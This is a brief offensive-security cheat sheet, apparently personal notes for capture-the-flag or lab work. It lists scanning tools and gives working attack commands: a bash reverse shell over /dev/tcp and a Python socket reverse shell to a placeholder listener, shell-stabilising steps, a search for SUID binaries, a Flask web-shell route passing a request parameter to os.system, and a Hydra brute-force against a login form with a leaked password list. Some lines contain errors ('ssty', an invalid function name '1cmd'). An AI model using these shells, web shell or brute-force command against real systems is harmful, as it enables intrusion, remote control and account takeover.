dir scanner:
1. feroxbuster -u <IP>
2. ffuf
3. wfuzz

Web scan:
nikto -h < IP>
whatweb <IP>
sublist3r -d <DOMAIN>

Shell from bash: 
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"


Get bash:
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash
ssty raw -echo
fg
export TERM=xterm

Bash from web:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

Find service:

ps aux | grep <SERVICE>
find / -user root -perm -4000 -executable -type f 2>/dev/null

Python cmd spawn:
@app.route('/exec')
def 1cmd():
    return os.system(request.args.get('cmd'))


Hydra:

hydra 127.0.0.1 -s 4444 -V -f http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password' -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
